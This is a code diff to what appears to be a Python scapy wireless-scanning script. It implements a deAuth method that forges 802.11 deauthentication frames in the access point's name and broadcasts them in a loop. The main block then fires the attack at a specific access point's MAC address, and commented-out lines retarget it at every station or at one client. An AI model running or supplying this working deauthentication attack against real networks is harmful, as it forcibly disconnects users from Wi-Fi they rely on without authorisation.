@@ -1,6 +1,7 @@
+from operator import ne
 import sys, os, signal,json
 from multiprocessing import Process
-from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11ProbeResp,Dot11Elt
+from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11ProbeResp,Dot11Elt, RadioTap, sendp, Dot11Deauth
 from scapy.all import *
 
 def channel_hopper():
@@ -94,22 +95,27 @@ class Network:
 
             # Display discovered AP    
             print ("%02d  %s  %s %s" % (int(channel), enc, bssid, ssid))
-    def deAuth(stationAdr, apAdr):
+    def deAuth(self, stationAdr, apAdr, channel):
         #write down u are code
-        return ""
+        self.setChannel(channel)
+        ap = apAdr
+        client = "FF:FF:FF:FF:FF:FF"
+        pkt = RadioTap() / Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()
+        sendp(pkt, iface=self.interface, inter=0.100, loop=1, count=20)
 
 if __name__ == "__main__":
 
 
     # Start the channel hopper
     p = Process(target = channel_hopper)
-
     network = Network("wlan0mon")
     print("set channel")
-    print("dar", network.getPowerData("fc:7f:f1:b0:55:80", 6))
+    #print("dar", network.getPowerData("fc:7f:f1:b0:55:80", 6))
 #    network.getPowerData("fc:7f:f1:ae:80:e0", 11)
-
-    #network.updateApList()
+    network.deAuth("FF:FF:FF:FF:FF:FF", "90:9f:33:1b:13:aa", 1)
+    #network.deAuth("FF:FF:FF:FF:FF:FF", "FF:FF:FF:FF:FF:FF", 1)
+    #network.deAuth("08:AE:D6:01:98:5F", "90:9f:33:1b:13:aa", 1)
+    #network.updateApList(p)
     #print(network.getApList())
     #p2 = Process(target=network.getPowerData)
     #p2.start()
